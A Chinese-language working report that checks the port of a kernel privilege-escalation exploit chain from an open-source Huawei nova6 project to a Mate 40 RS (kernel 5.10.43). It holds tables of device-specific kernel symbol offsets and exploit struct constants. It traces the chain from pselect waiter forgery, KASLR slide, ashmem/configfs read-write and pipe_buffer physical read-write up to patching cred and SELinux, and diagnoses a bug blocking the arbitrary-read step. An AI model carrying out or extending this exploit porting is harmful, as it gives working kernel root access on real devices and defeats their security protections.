# 对着已跑通开源项目（HWWLZ nova6 / 5.10.43）的全流程核验

核验对象：本机 `HUAWEI NOP-AN01P`（Mate 40 RS，Kirin 9000，HarmonyOS 4.2，kernel 5.10.43）
参照母本：`ref/src_hwwlz/Eknight-Eutopia-GhostLock-Huawei-HWWLZ-0047e27`
证据源：`ref/nop_syms.txt`（本机 vmlinux 符号表，`_text = 0xffffffc010000000`）、母本 `Makefile`、母本 `src/layout_check.c`、双份 `target.h`

---

## 一、结论摘要

1. **算法与流程不需要再发明**：母本本身就是 Huawei / 5.10.43（nova6），README 五步全 `[x]`，第 4 步「pipe physrw 已通」、第 5 步拿到过 root shell。我们唯一需要自产的是 `nop_nop_an01p/target.h` 的**逐设备绝对偏移**。
2. **偏移核验结果：全部对得上**（26 项逐项核到符号地址，无一处错误）。
3. **结构体常量与母本逐字节一致**（`PIPE_BUFFER_SIZE`、`PIPE_SCAN_CHUNK`、`PIPE_BUF_FLAG_CAN_MERGE`、`PIPE_BUFS_OFF`、`KMALLOC_PIPE_*`、`CFG_*`、`FOPS_*`、`STRUCT_PAGE_*`），所以 pipe 步骤看到的布局与母本完全相同。
4. **第 ④ 步失败的根因是我们自己改出来的单行 bug**（`configfs_read_once` 未设 `bin_buffer_size`），已修。
5. **流程上最大的偏差是：我们一直手搓 clang 命令行，绕过了母本自带的三个校验工具**（`layout-check` / `buddyinfo-check` / `fd-budget-check`）。

---

## 二、偏移核验表（本机符号 vs `nop_nop_an01p/target.h`）

`offset = symbol_vaddr − 0xffffffc010000000`

| target.h 宏 | target.h 值 | 本机符号 | 符号地址 | 核对 |
|---|---|---|---|---|
| `ASHMEM_MISC_FOPS_OFF` | `0x03B97708` | `ashmem_misc` | `0x03B976F8` | ✅ `+0x10` = `miscdevice.fops` |
| `ASHMEM_FOPS_OFF` | `0x030FFFF0` | `ashmem_fops` | `0x030FFFF0` | ✅ |
| `ASHMEM_IOCTL_OFF` | `0x0262925C` | `ashmem_ioctl.cfi_jt` | `0x0262925C` | ✅ |
| `ASHMEM_MMAP_OFF` | `0x02623254` | `ashmem_mmap.cfi_jt` | `0x02623254` | ✅ |
| `ASHMEM_OPEN_OFF` | `0x02629B60` | `ashmem_open.cfi_jt` | `0x02629B60` | ✅ |
| `ASHMEM_RELEASE_OFF` | `0x02629B64` | `ashmem_release.cfi_jt` | `0x02629B64` | ✅ |
| `ASHMEM_SHOW_FDINFO_OFF` | `0x02613158` | `ashmem_show_fdinfo.cfi_jt` | `0x02613158` | ✅ |
| `CONFIGFS_READ_ITER_OFF` | `0x02621BD0` | `configfs_read_file.cfi_jt` | `0x02621BD0` | ✅ |
| `CONFIGFS_BIN_WRITE_ITER_OFF` | `0x02625878` | `configfs_write_bin_file.cfi_jt` | `0x02625878` | ✅ |
| `CONFIGFS_WRITE_FILE_ITER_OFF` | `0x02625874` | `configfs_write_file.cfi_jt` | `0x02625874` | ✅ |
| `NOOP_LLSEEK_OFF` | `0x00474DCC` | `noop_llseek` | `0x00474DCC` | ✅ |
| `INIT_TASK_OFF` | `0x036F4980` | `init_task` | `0x036F4980` | ✅ |
| `ROOT_TASK_GROUP_OFF` | `0x03D2D780` | `root_task_group` | `0x03D2D780` | ✅ |
| `SELINUX_BLOB_SIZES_OFF` | `0x02821088` | `selinux_blob_sizes` | `0x02821088` | ✅ |
| `SELINUX_ENFORCING_OFF` | `0x03EBB068` | `selinux_state` | `0x03EBB068` | ✅ |
| `SECURITY_HOOK_HEADS_OFF` | `0x028209F8` | `security_hook_heads` | `0x028209F8` | ✅ |
| `KMALLOC_CACHES_OFF` | `0x028204D0` | `kmalloc_caches` | `0x028204D0` | ✅ |
| `ANON_PIPE_BUF_OPS_OFF` | `0x0305FE88` | `anon_pipe_buf_ops` | `0x0305FE88` | ✅ |
| `MODPROBE_PATH_OFF` | `0x036D0388` | `modprobe_path` | `0x036D0388` | ✅ |
| `PIPE_MAX_SIZE_OFF` | `0x03ABC5A8` | `pipe_max_size` | `0x03ABC5A8` | ✅ |
| `PIPE_USER_PAGES_SOFT_OFF` | `0x03ABC5A0` | `pipe_user_pages_soft` | `0x03ABC5A0` | ✅ |
| `EMPTY_ZERO_PAGE_OFF` | `0x03D27000` | `empty_zero_page` | `0x03D27000` | ✅ |
| `SCHEDULE_OFF` | `0x028000B0` | `__schedule` | `0x028000B0` | ✅ |
| `SLIDE_NFULNL_LOGGER_OFF` | `0x036E8A60` | `nfulnl_logger` | `0x036E8A60` | ✅ |
| `SLIDE_LOGGERS_0_1_OFF` | `0x036E8998` | `loggers` | `0x036E8988` | ✅ `+0x10` |
| `SLIDE_SYSCTL_BOOTID_OFF` / `SLIDE_RANDOM_BOOT_ID_DATA_OFF` | `0x03EEAC44` | `sysctl_bootid` | `0x03EEAC44` | ✅ |

### 两处"看起来不一致"其实正确

- **`ASHMEM_MISC_FOPS_OFF` 比 `ashmem_misc` 大 `0x10`**：宏名指的是 `struct miscdevice.fops` **字段地址**，而我们要覆写的正是这个字段，`minor` 占 `0x00`、`name` 占 `0x08`、`fops` 在 `0x10`。正确做法，不是笔误。
- **`MM_OWNER_OFF`**：母本 `1032 (0x408)`，本机 `0x330`。本机值是照 `mm_update_next_owner()` 首条 `ldr x8,[x0,#0x330]` 定的。**该字段不在⑤的关键路径上**（早前实测 `mm->owner` 读到 0，捷径已弃用），不影响。

### 两个占位项（非错误）

- `COPY_SPLICE_READ_OFF 0x004d9358`：本机内核查无 `copy_splice_read` 符号（那是 6.x 的），该槽位是照抄 S22U/nova6 的**占位**，`pread/pwrite` 路径不会用到 `splice_read`。
- `ASHMEM_COMPAT_IOCTL_OFF`：本机无 `ashmem_compat_ioctl`，值是 `ashmem_ioctl.cfi_jt + 4` 的占位。

---

## 三、结构体常量核验（与母本 nova6 逐项对比）

以下全部**逐字相同**，因此 pipe 步骤在两台机器上看到的布局完全一致：

```
PIPE_BUFFER_SIZE 0x28      PIPE_BUFFER_SLOTS 512     PIPE_SCAN_CHUNK 0x80
PIPE_BUF_FLAG_CAN_MERGE 0x10   PIPE_READERS_WRITERS_OFF 0x70   PIPE_BUFS_OFF 0x90
KMALLOC_CGROUP_TYPE 1      KMALLOC_PIPE_INDEX 9      KMALLOC_PIPE_OBJ_SIZE 0xa0
KMALLOC_CACHE_TYPES 3      MM_STRUCT_SZ 0x3c0        MM_ORDER 3  MM_CPU_PARTIAL 13
STRUCT_PAGE_SIZE 0x40      STRUCT_PAGE_COMPOUND_HEAD_OFF 0x08  STRUCT_SLAB_CACHE_OFF 0x08
CFG_PAGE_OFF 16            CFG_NEEDS_READ_FILL_OFF 64  CFG_BIN_BUFFER_OFF 72
CFG_BIN_BUFFER_SIZE_OFF 80 CFG_CB_MAX_SIZE_OFF 84
FOPS_OWNER_OFF 0x00 ... FOPS_SHOW_FDINFO_OFF 0xe0（全表）
LOCK_OFF 0x1350  LOCK2_OFF 0x1400  W0_OFF 0x2220  FOPS_OFF 0x1000  FAKE_TASK_OFF 0x3200
SKB_DATA_DELTA 0  SKB_FRAG_BIAS 0xe80  SKB_RECLAIM_SENDS 24  SKB_RECLAIM_PAIRS 8
KIMAGE_TEXT_BASE 0xffffffc010000000  P0_PAGE_OFFSET 0xffffff8000000000
P0_PHYS_OFFSET 0x40000000  VMEMMAP_START 0xfffffffeffe00000
CONFIGFS_USE_FILE_RW 1     PSELECT_WAITER_LAYOUT_5_10 1
```

内存模型三常量（`DIRECT_MAP_BASE` / `VMEMMAP_START` / `P0_PHYS_OFFSET`）与母本完全相同 ⇒ `layout.h` 的 `direct_to_page` / `page_to_direct` 与母本行为一致，`install_pipe_physrw()` 里 `proof_page != (proof_addr & ~0xfff)` 这道前置校验必然表现一致。

---

## 四、流程与工具核验

### 4.1 正式构建入口（我们一直没有用它）

```bash
make PROJECT=nop_nop_an01p API=35          # 产物 build/nop_nop_an01p/bin/preload.so
make PROJECT=nop_nop_an01p info            # 打印实际使用的 CC/flags/源文件列表
make list-projects                         # 确认 target 已注册
```

`CORE_SRCS` = `main.c util.c slide.c fops.c pipe.c src/root.c`（每个文件优先取 `targets/<proj>/` 下的同名覆盖，否则用 `src/`）。我们只有 `target.h`，所以全部走 `src/` 的共享代码 —— **和 nova6 跑的完全是同一份代码**。

`PRELOAD_SRCS` 额外含 `src/preload.c`、`src/su_blob.S`、`src/wallpaper_blob.S`；其中 `su_blob.S` 内嵌的是 `build/embed/su_daemon_aarch64_pie`（由 `src/su_daemon.c` 单独编译成 PIE 生成）。**手搓命令行会漏掉这个 PIE 生成步骤。**

工具链参数（Makefile 用的，我们手搓时漏了）：`-resource-dir <ndk>/lib/clang/21`、`--rtlib=compiler-rt`、`--unwindlib=none`、`-fuse-ld=lld`、`-Wl,-rpath-link=<sysroot>/usr/lib/aarch64-linux-android/35`。

### 4.2 母本自带的三个静态校验工具（我们从未跑过）

| 工具 | 作用 |
|---|---|
| `make layout-check` | 编译 `src/layout_check.c`，校验 `layout.h` 的 VA↔`struct page` 换算：`phys_pfn != 0`、device 公式 ≠ QEMU wrap、往返一致、默认路径必须等同 device 公式 |
| `make buddyinfo-check` | `src/buddyinfo_check.c`：校验 order 回收相关的 `buddyinfo.h` |
| `make fd-budget-check` | `src/fd_budget_check.c`：校验 `fd_budget.h`（第④步 `ensure_pipe_fd_budget()` 的依据） |

注意 `layout_check.c` 第 5 行把 `TARGET_CONFIG_H` **硬编码**为 `targets/huawei_wlz_5_10_43/target.h`，所以它校验的是共享换算代码本身，不随 `PROJECT` 变化。对我们而言它照样有意义：若通过，说明 `layout.h` 的换算逻辑与母本一致（我们的三个内存模型常量与母本相同 ⇒ 必然通过）。

### 4.3 五步链路逐步对照

| 步 | 母本（nova6，已跑通） | 我们 | 判定 |
|---|---|---|---|
| ① `pselect` 回收栈帧伪造 waiter | `fops.c` `prepare_pselect_fdsets` 的 5.10 分支 | 同（被我们改过排布，见 §5） | 实测命中 4/6 ✅ |
| ② KASLR slide | tracefs | tracefs（`SLIDE_TRACEFS_*`） | 实测正确 ✅ |
| ③ ashmem→configfs 受限读写 | `configfs_read_file` / `configfs_write_bin_file` | 同 | 写 ✅ / 读 **曾被我们打断**，已修 |
| ④ pipe_buffer→任意读写 | `pipe.c` `install_pipe_physrw` | 同（`PIPE_*` 常量全同） | **卡在 read_ok**，根因已定位 |
| ⑤ patch cred / SELinux | `root.c` + `TASK_CRED_OFF` 等 | 同 | 未执行过 |

---

## 五、我们相对母本的偏差清单

| # | 位置 | 偏差 | 处置 |
|---|---|---|---|
| 1 | `src/util.c` `configfs_read_once` 5.10 分支 | 只设 `page`+`needs_read_fill`，**漏 `bin_buffer_size`** → `simple_read_from_buffer` 因 `*ppos >= available` 恒返回 0 | **已修**（补 `bin_buffer_size = 0x7f7f7f7f`） |
| 2 | `src/util.c` `configfs_write_once` 5.10 分支 | 自造 `aligned`+`size=0x7f7f7f7f`+`pos=target&0xfff`；母本/上游是 `bin_buffer=target`、`size=len`、`pos=0` | 实测写成功，可保留；若后续仍异常，优先回退为母本 `#else` 写法 |
| 3 | `src/fops.c` pre-check 后早退分支 | 直接 `install_child_root()` 并打印 `root installed (self-checks skipped)`，**绕过④⑤的自检** | **建议移除**：它会掩盖失败，且当前未被触发 |
| 4 | `targets/nop_nop_an01p/entry.c` | 我早前自建的单发入口，`Makefile` 根本不引用 | **建议删除** |
| 5 | 构建方式 | 手搓 clang 命令行，绕过 Makefile 与三个校验工具 | 改用 `make PROJECT=nop_nop_an01p API=35` |
| 6 | `MM_OWNER_OFF` | `0x330`（母本 `1032`） | 不在关键路径，保留 |
| 7 | `SLIDE_TRACEFS_WORKER_LINK` | `0x001050E4`（= `worker_thread` 入口）；母本用 `entry+0x590` 语义 | ② 实测正确 ⇒ 当前值可用，但语义待确认 |

---

## 六、下一步（按优先级）

1. 用 `make PROJECT=nop_nop_an01p API=35` 重新构建（不要手搓），对比 `sha256`。
2. 跑一次真机，看 `phys step probed read done ok=` 是否翻成 `1`。
3. 若仍为 0，则按 §5-#2 把 `configfs_write_once` 5.10 分支回退成母本写法再试。
4. ⑤ 落地前，静态核 `TASK_CRED_OFF 0x800` / `CRED_UID_OFF 4` / `TASK_SECCOMP_OFF 0x8a8`（从未执行到，是下一处风险）。
5. 记住母本 README 的既有结论：**hkip 会拦住 su 常驻、且保护 SELinux 关不掉**。目标是「临时 root / cred uid=0」，持久化不在本链路能力内。

---

## 七、用母本自带工具链做的独立交叉验证（已实跑）

### 7.1 现成的东西到底有哪些

| 来源 | 现成资产 | 说明 |
|---|---|---|
| HWWLZ | 每 target 一份 `src/targets/<proj>/target.h` | **唯一的偏移来源**；`src/offset.h` 只是 `#include TARGET_CONFIG_H`，没有任何隐藏默认值 ⇒ 不存在"漏填字段被静默默认"的风险 |
| HWWLZ | `Makefile` | 正式构建入口 + `layout-check` / `buddyinfo-check` / `fd-budget-check` 三个 host 校验程序 |
| OnePlus | `tools/extract_target.py` | 从 kallsyms 符号表**自动生成** target.h 偏移字段（含 `loggers+0x10` 这类特殊规则） |
| OnePlus | `tools/kallsyms/*.py` + `GUIDE.md` | 完整链路：`boot.img → kernel → vmlinux → kallsyms.txt → target.h` |
| OnePlus | `tools/extract_btf.py` | 从 BTF 提取**结构体字段偏移**（本项目 vmlinux 无 BTF，用不上） |
| OnePlus | `tools/check_feasibility.py` | 直接吃 `boot.img` 做可利用性判定 |

### 7.2 实际跑出来的结果

```bash
python tools/extract_target.py --kallsyms ref/nop_syms.txt
```

`ref/nop_syms.txt` 正是它要求的格式。载入 **213383 个符号**，`KIMAGE_TEXT_BASE = 0xFFFFFFC010000000`：

| 字段 | 提取器给出 | 我们的 target.h | 结论 |
|---|---|---|---|
| `ANON_PIPE_BUF_OPS_OFF` | `0x0305FE88` | `0x0305FE88` | ✅ |
| `EMPTY_ZERO_PAGE_OFF` | `0x03D27000` | `0x03D27000` | ✅ |
| `INIT_TASK_OFF` | `0x036F4980` | `0x036F4980` | ✅ |
| `KMALLOC_CACHES_OFF` | `0x028204D0` | `0x028204D0` | ✅ |
| `NOOP_LLSEEK_OFF` | `0x00474DCC` | `0x00474DCC` | ✅ |
| `ROOT_TASK_GROUP_OFF` | `0x03D2D780` | `0x03D2D780` | ✅ |
| `SECURITY_HOOK_HEADS_OFF` | `0x028209F8` | `0x028209F8` | ✅ |
| `SELINUX_BLOB_SIZES_OFF` | `0x02821088` | `0x02821088` | ✅ |
| `SELINUX_ENFORCING_OFF` | `0x03EBB068` | `0x03EBB068` | ✅ |
| `SLIDE_NFULNL_LOGGER_OFF` | `0x036E8A60` | `0x036E8A60` | ✅ |
| `SLIDE_LOGGERS_0_1_OFF` | `0x036E8998` | `0x036E8998` | ✅（= `loggers`+0x10，工具内置同一规则） |
| `SLIDE_SYSCTL_BOOTID_OFF` | `0x03EEAC44` | `0x03EEAC44` | ✅ |
| `SLIDE_RANDOM_BOOT_ID_DATA_OFF` | `0x03EEAC44` | `0x03EEAC44` | ✅ |
| `ASHMEM_MISC_FOPS_OFF` | `0x03B976F8` | `0x03B97708` | ⚠️ **约定差异**：工具给 `ashmem_misc` 基址，HWWLZ 要 `miscdevice.fops` **字段址** = 基址+0x10。两者都对 |
| `CONFIGFS_READ_ITER_OFF` | NOT FOUND | `0x02621BD0` | ⚠️ 工具找 6.x 的 `configfs_bin_read_iter`；5.10 只有 `configfs_read_file.cfi_jt`，母本写法正确 |
| `CONFIGFS_BIN_WRITE_ITER_OFF` | NOT FOUND | `0x02625878` | ⚠️ 同上，`configfs_write_bin_file.cfi_jt` |
| `COPY_SPLICE_READ_OFF` | NOT FOUND | `0x004d9358` | ⚠️ 5.10 无 `copy_splice_read`，占位值，`pread/pwrite` 不经过 |

工具末尾的 5 个 `[FAIL]`（`init_task`/`init_cred`/`selinux_state`/`loggers` 类型 `'o'`、`noop_llseek` 类型 `'f'`）全部是**符号表格式问题**：它期望 `D`/`B`/`FUNC`，而 nm 风格 dump 给的是小写 `o`/`f`。地址本身都正确取出，属误报。

### 7.3 工具额外拿出、我们没用的字段

`INIT_CRED_OFF = 0x037048D0`、`INIT_UTS_NS_OFF = 0x036F4768`、`KPTR_RESTRICT_OFF = 0x036E3BC8`。

已 grep 确认：`INIT_UTS_NS` 只在 `targets/okay-CP2A.260605.012/pipe.c`（Android 17 专用覆盖）里出现；`INIT_CRED` / `KPTR_RESTRICT` / `CAP_CAPABLE_ACTIVE` 在共享 5.10 路径中**完全未被引用**（⑤ 走 `INIT_TASK_OFF + TASK_CRED_OFF`，两者我们都有）。⇒ **target.h 对当前代码路径完整，不缺字段。**

### 7.4 结构体偏移的核验边界（必须说清）

本项目 `vmlinux_nop_2026.elf` 只有 6 个段，**无 `.BTF`、无 DWARF**，所以 `extract_btf.py` 不可用；`TASK_CRED_OFF 0x800` / `CFG_*` / `PIPE_BUFS_OFF 0x90` / `FOPS_*` / `MM_OWNER_OFF` 这类**结构体字段无法从镜像独立提取**。

它们的依据只有一条，但很强：**与已跑通的 nova6 `target.h` 逐字相同**（唯一例外 `MM_OWNER_OFF`，且不在关键路径）。这是当前手段下能达到的最高等级验证。
